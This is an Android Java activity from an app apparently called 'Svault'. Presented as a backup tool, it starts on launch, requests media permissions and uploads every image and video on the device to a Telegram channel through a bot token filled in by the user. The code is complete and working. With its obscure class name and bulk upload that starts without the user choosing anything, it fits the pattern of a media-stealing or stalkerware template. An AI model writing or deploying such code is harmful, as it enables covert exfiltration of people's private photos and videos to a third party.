package com.tenix.svault;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class inq extends Activity {

    // ── CONFIG ───────────────────────────────────────────────
    static final String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
    // Public:  @channel_username
    // Private: -1001234567890
    static final String CHANNEL_ID = "@your_channel_or_-100xxxxxxxxxx";
    // ────────────────────────────────────────────────────────

    private static final int    REQ_PERM      = 1;
    private static final int    NOTIF_ID      = 55;
    private static final String NOTIF_CH      = "svault_upload";
    private static final long   MAX_SIZE      = 50L * 1024 * 1024;
    private static final int    DELAY_MS      = 350;

    private NotificationManager nm;
    private ExecutorService     executor;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        executor = Executors.newSingleThreadExecutor();
        nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        initNotifChannel();
        askPermissions();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executor != null && !executor.isShutdown()) executor.shutdown();
    }

    // ── Permissions ───────────────────────────────────────────

    @SuppressWarnings("NewApi")
    private void askPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] perms = {
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.POST_NOTIFICATIONS
            };
            boolean all = true;
            for (String p : perms)
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) { all = false; break; }
            if (!all) requestPermissions(perms, REQ_PERM);
            else      startUpload();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED)
                requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_PERM);
            else startUpload();
        } else {
            startUpload();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        if (code != REQ_PERM) return;
        for (int i = 0; i < perms.length; i++) {
            String p = perms[i];
            if (results[i] == PackageManager.PERMISSION_GRANTED
                    && (p.equals(Manifest.permission.READ_MEDIA_IMAGES)
                     || p.equals(Manifest.permission.READ_EXTERNAL_STORAGE))) {
                startUpload(); return;
            }
        }
        Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
        finish();
    }

    // ── Upload flow ───────────────────────────────────────────

    private void startUpload() {
        executor.execute(() -> {

            // ── STEP 1: Verify bot token ──────────────────
            String[] r1 = new String[1];
            int meCode = getMe(r1);
            if (meCode != 200) {
                errorNotif("❌ Bot token invalid!\nCode: " + meCode + "\n" + r1[0]);
                return;
            }

            // ── STEP 2: Verify channel access ─────────────
            String[] r2 = new String[1];
            int msgCode = sendText("🔵 Svault backup started", r2);
            if (msgCode != 200) {
                errorNotif("❌ Channel error!\n"
                        + "ID used: " + CHANNEL_ID + "\n"
                        + "Code: " + msgCode + "\n" + r2[0]);
                return;
            }

            // ── STEP 3: Upload all media ───────────────────
            ArrayList<Uri> all = collectMedia();
            int total = all.size();
            if (total == 0) {
                infoNotif("No media found on device.");
                return;
            }

            int ok = 0, skipped = 0;
            for (int i = 0; i < total; i++) {
                Uri uri = all.get(i);
                long sz = getFileSize(uri);
                if (sz > MAX_SIZE) { skipped++; pushNotif(i + 1, total, ok); continue; }
                if (sendDocument(uri)) ok++;
                pushNotif(i + 1, total, ok);
                try { Thread.sleep(DELAY_MS); } catch (InterruptedException ignored) {}
            }
            doneNotif(ok, total, skipped);
        });
    }

    // ── Telegram: getMe ───────────────────────────────────────

    private int getMe(String[] out) {
        try {
            HttpURLConnection c = (HttpURLConnection)
                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getMe")
                    .openConnection();
            c.setConnectTimeout(15_000);
            c.setReadTimeout(15_000);
            int code = c.getResponseCode();
            out[0] = drain(c, code);
            c.disconnect();
            return code;
        } catch (Exception e) { out[0] = e.getMessage(); return -1; }
    }

    // ── Telegram: sendMessage (text) ──────────────────────────

    private int sendText(String text, String[] out) {
        try {
            HttpURLConnection c = (HttpURLConnection)
                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                    .openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setDoInput(true);
            c.setConnectTimeout(15_000);
            c.setReadTimeout(15_000);
            c.setRequestProperty("Content-Type",
                    "application/x-www-form-urlencoded; charset=UTF-8");

            String body = "chat_id=" + enc(CHANNEL_ID) + "&text=" + enc(text);
            byte[] bytes = body.getBytes("UTF-8");
            c.setRequestProperty("Content-Length", String.valueOf(bytes.length));
            DataOutputStream o = new DataOutputStream(c.getOutputStream());
            o.write(bytes); o.flush(); o.close();

            int code = c.getResponseCode();
            out[0] = drain(c, code);
            c.disconnect();
            return code;
        } catch (Exception e) { out[0] = e.getMessage(); return -1; }
    }

    // ── Telegram: sendDocument (file) ────────────────────────

    private boolean sendDocument(Uri uri) {
        try {
            String mime  = getContentResolver().getType(uri);
            if (mime == null) mime = "application/octet-stream";
            String bound = "SVB" + System.currentTimeMillis();

            HttpURLConnection c = (HttpURLConnection)
                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
                    .openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setDoInput(true);
            c.setConnectTimeout(30_000);
            c.setReadTimeout(180_000);
            c.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + bound);
            c.setRequestProperty("Connection", "close");

            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            // chat_id
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(CHANNEL_ID + "\r\n");
            // document
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; "
                    + "name=\"document\"; filename=\"file\"\r\n");
            out.writeBytes("Content-Type: " + mime + "\r\n\r\n");
            try (InputStream in = getContentResolver().openInputStream(uri)) {
                byte[] buf = new byte[8192]; int n;
                if (in != null) while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
            }
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush(); out.close();

            int code = c.getResponseCode();
            drain(c, code);
            c.disconnect();
            return code == 200;
        } catch (Exception e) { return false; }
    }

    // ── Media scanning ────────────────────────────────────────

    private ArrayList<Uri> collectMedia() {
        ArrayList<Uri> list = new ArrayList<>();
        try (Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID},
                null, null, MediaStore.Images.Media.DATE_ADDED + " ASC")) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}
        try (Cursor c = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media._ID},
                null, null, MediaStore.Video.Media.DATE_ADDED + " ASC")) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}
        return list;
    }

    private long getFileSize(Uri uri) {
        try {
            AssetFileDescriptor a = getContentResolver().openAssetFileDescriptor(uri, "r");
            if (a != null) { long s = a.getLength(); a.close(); return s; }
        } catch (Exception ignored) {}
        return 0;
    }

    // ── Helpers ───────────────────────────────────────────────

    private String drain(HttpURLConnection c, int code) {
        try {
            InputStream s = (code == 200) ? c.getInputStream() : c.getErrorStream();
            if (s == null) return "";
            StringBuilder sb = new StringBuilder();
            byte[] buf = new byte[1024]; int n;
            while ((n = s.read(buf)) != -1) sb.append(new String(buf, 0, n, "UTF-8"));
            s.close();
            return sb.toString();
        } catch (Exception e) { return e.getMessage(); }
    }

    private static String enc(String s) {
        try { return java.net.URLEncoder.encode(s, "UTF-8"); }
        catch (Exception e) { return s; }
    }

    // ── Notifications ─────────────────────────────────────────

    private void initNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            nm.createNotificationChannel(new NotificationChannel(
                    NOTIF_CH, "Svault Upload", NotificationManager.IMPORTANCE_LOW));
    }

    @SuppressWarnings("deprecation")
    private void errorNotif(String msg) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_dialog_alert)
         .setContentTitle("Svault — Error")
         .setContentText(msg)
         .setStyle(new Notification.BigTextStyle().bigText(msg))
         .setAutoCancel(true);
        nm.notify(NOTIF_ID, b.build());
    }

    @SuppressWarnings("deprecation")
    private void infoNotif(String msg) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_info_details)
         .setContentTitle("Svault")
         .setContentText(msg)
         .setAutoCancel(true);
        nm.notify(NOTIF_ID, b.build());
    }

    @SuppressWarnings("deprecation")
    private void pushNotif(int cur, int total, int ok) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — uploading  ✓ " + ok)
         .setContentText(cur + " / " + total)
         .setProgress(total, cur, false)
         .setOngoing(true);
        nm.notify(NOTIF_ID, b.build());
    }

    @SuppressWarnings("deprecation")
    private void doneNotif(int ok, int total, int skipped) {
        String text = ok + " / " + total + " sent";
        if (skipped > 0) text += "  •  " + skipped + " skipped (>50MB)";
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — complete")
         .setContentText(text)
         .setAutoCancel(true).setOngoing(false);
        nm.notify(NOTIF_ID, b.build());
    }
}
